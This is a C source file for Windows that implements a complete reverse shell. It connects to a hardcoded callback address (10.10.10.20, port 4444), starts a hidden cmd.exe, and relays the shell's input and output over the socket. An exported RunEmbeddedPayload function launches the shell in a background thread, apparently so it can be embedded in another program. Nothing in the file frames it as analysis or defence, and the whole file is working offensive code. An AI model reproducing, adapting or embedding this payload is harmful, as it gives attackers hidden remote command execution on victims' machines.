#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>

static const char kCallbackIp[] = "10.10.10.20";
static const unsigned short kCallbackPort = 4444;

typedef struct _OUTPUT_RELAY_CONTEXT {
    SOCKET callback_socket;
    HANDLE output_pipe;
} OUTPUT_RELAY_CONTEXT;

static BOOL send_bytes(SOCKET callback_socket, const char *data, int length)
{
    int total = 0;

    while (total < length) {
        int sent = send(callback_socket, data + total, length - total, 0);
        if ((sent == SOCKET_ERROR) || (sent == 0)) {
            return FALSE;
        }
        total += sent;
    }
    return TRUE;
}

static BOOL send_text(SOCKET callback_socket, const char *message)
{
    return send_bytes(callback_socket, message, lstrlenA(message));
}

static void send_error(SOCKET callback_socket, const char *step, DWORD error)
{
    char message[256] = { 0 };
    wsprintfA(message, "error=%s:%lu\r\n", step, error);
    send_text(callback_socket, message);
}

static DWORD WINAPI relay_child_output(LPVOID parameter)
{
    OUTPUT_RELAY_CONTEXT *context = (OUTPUT_RELAY_CONTEXT *)parameter;
    char buffer[4096];
    DWORD bytes_read = 0;

    while (ReadFile(
            context->output_pipe,
            buffer,
            sizeof(buffer),
            &bytes_read,
            NULL)) {
        if ((bytes_read == 0) ||
                !send_bytes(context->callback_socket, buffer, bytes_read)) {
            break;
        }
    }
    return 0;
}

static BOOL build_system_path(const char *filename, char path[MAX_PATH])
{
    UINT length = GetSystemDirectoryA(path, MAX_PATH);

    if ((length == 0) || (length >= MAX_PATH)) {
        return FALSE;
    }
    if ((length + 1 + lstrlenA(filename) + 1) > MAX_PATH) {
        return FALSE;
    }

    path[length] = '\\';
    path[length + 1] = '\0';
    lstrcatA(path, filename);
    return TRUE;
}

static BOOL run_fixed_reverse_shell(void)
{
    WSADATA winsock_data;
    SOCKET callback_socket = INVALID_SOCKET;
    struct sockaddr_in callback_address;
    SECURITY_ATTRIBUTES pipe_security;
    HANDLE child_stdout_read = NULL;
    HANDLE child_stdout_write = NULL;
    HANDLE child_stdin_read = NULL;
    HANDLE child_stdin_write = NULL;
    HANDLE output_thread = NULL;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    OUTPUT_RELAY_CONTEXT relay_context;
    char command_path[MAX_PATH] = { 0 };
    char command_line[] = "cmd.exe /Q /K echo stage=child_ready";
    char desktop_name[] = "WinSta0\\Default";
    DWORD receive_timeout = 1000;
    BOOL launched = FALSE;

    ZeroMemory(&winsock_data, sizeof(winsock_data));
    ZeroMemory(&callback_address, sizeof(callback_address));
    ZeroMemory(&pipe_security, sizeof(pipe_security));
    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    ZeroMemory(&relay_context, sizeof(relay_context));

    if (WSAStartup(MAKEWORD(2, 2), &winsock_data) != 0) {
        return FALSE;
    }

    callback_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (callback_socket == INVALID_SOCKET) {
        goto cleanup;
    }

    callback_address.sin_family = AF_INET;
    callback_address.sin_port = htons(kCallbackPort);
    callback_address.sin_addr.s_addr = inet_addr(kCallbackIp);

    if (connect(callback_socket, (struct sockaddr *)&callback_address,
            sizeof(callback_address)) == SOCKET_ERROR) {
        goto cleanup;
    }
    if (!send_text(callback_socket, "stage=connected\r\n")) {
        goto cleanup;
    }

    pipe_security.nLength = sizeof(pipe_security);
    pipe_security.bInheritHandle = TRUE;

    if (!CreatePipe(
            &child_stdout_read,
            &child_stdout_write,
            &pipe_security,
            0)) {
        send_error(callback_socket, "CreatePipe.stdout", GetLastError());
        goto cleanup;
    }
    if (!SetHandleInformation(
            child_stdout_read, HANDLE_FLAG_INHERIT, 0)) {
        send_error(callback_socket, "SetHandleInformation.stdout", GetLastError());
        goto cleanup;
    }

    if (!CreatePipe(
            &child_stdin_read,
            &child_stdin_write,
            &pipe_security,
            0)) {
        send_error(callback_socket, "CreatePipe.stdin", GetLastError());
        goto cleanup;
    }
    if (!SetHandleInformation(
            child_stdin_write, HANDLE_FLAG_INHERIT, 0)) {
        send_error(callback_socket, "SetHandleInformation.stdin", GetLastError());
        goto cleanup;
    }

    if (!build_system_path("cmd.exe", command_path)) {
        send_error(callback_socket, "build_system_path", 0);
        goto cleanup;
    }

    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.lpDesktop = desktop_name;
    startup_info.hStdInput = child_stdin_read;
    startup_info.hStdOutput = child_stdout_write;
    startup_info.hStdError = child_stdout_write;

    if (!CreateProcessA(
            command_path,
            command_line,
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &startup_info,
            &process_info)) {
        send_error(callback_socket, "CreateProcessA", GetLastError());
        goto cleanup;
    }
    launched = TRUE;
    CloseHandle(process_info.hThread);
    process_info.hThread = NULL;

    CloseHandle(child_stdin_read);
    child_stdin_read = NULL;
    CloseHandle(child_stdout_write);
    child_stdout_write = NULL;

    if (!send_text(callback_socket, "stage=cmd_started\r\n")) {
        goto cleanup;
    }

    relay_context.callback_socket = callback_socket;
    relay_context.output_pipe = child_stdout_read;
    output_thread = CreateThread(
        NULL, 0, relay_child_output, &relay_context, 0, NULL);
    if (output_thread == NULL) {
        send_error(callback_socket, "CreateThread.output", GetLastError());
        goto cleanup;
    }

    setsockopt(
        callback_socket,
        SOL_SOCKET,
        SO_RCVTIMEO,
        (const char *)&receive_timeout,
        sizeof(receive_timeout));

    while (WaitForSingleObject(process_info.hProcess, 0) == WAIT_TIMEOUT) {
        char input[4096];
        int received = recv(callback_socket, input, sizeof(input), 0);
        if (received > 0) {
            DWORD written = 0;
            if (!WriteFile(
                    child_stdin_write,
                    input,
                    received,
                    &written,
                    NULL) || (written != (DWORD)received)) {
                break;
            }
        }
        else if (received == 0) {
            break;
        }
        else {
            int error = WSAGetLastError();
            if (error != WSAETIMEDOUT) {
                break;
            }
        }
    }

cleanup:
    if (child_stdin_write != NULL) {
        CloseHandle(child_stdin_write);
        child_stdin_write = NULL;
    }

    if (process_info.hProcess != NULL) {
        if (WaitForSingleObject(process_info.hProcess, 5000) == WAIT_TIMEOUT) {
            TerminateProcess(process_info.hProcess, 1);
            WaitForSingleObject(process_info.hProcess, 5000);
        }
    }
    if (output_thread != NULL) {
        WaitForSingleObject(output_thread, 5000);
        CloseHandle(output_thread);
    }
    if (process_info.hThread != NULL) {
        CloseHandle(process_info.hThread);
    }
    if (process_info.hProcess != NULL) {
        CloseHandle(process_info.hProcess);
    }
    if (child_stdin_read != NULL) {
        CloseHandle(child_stdin_read);
    }
    if (child_stdout_write != NULL) {
        CloseHandle(child_stdout_write);
    }
    if (child_stdout_read != NULL) {
        CloseHandle(child_stdout_read);
    }
    if (callback_socket != INVALID_SOCKET) {
        closesocket(callback_socket);
    }
    WSACleanup();
    return launched;
}

static DWORD WINAPI reverse_shell_worker(LPVOID parameter)
{
    (void)parameter;
    run_fixed_reverse_shell();
    return 0;
}

#ifdef __cplusplus
extern "C"
#endif
BOOL RunEmbeddedPayload(void)
{
    HANDLE worker = CreateThread(
        NULL, 0, reverse_shell_worker, NULL, 0, NULL);
    if (worker == NULL) {
        return FALSE;
    }
    CloseHandle(worker);
    return TRUE;
}
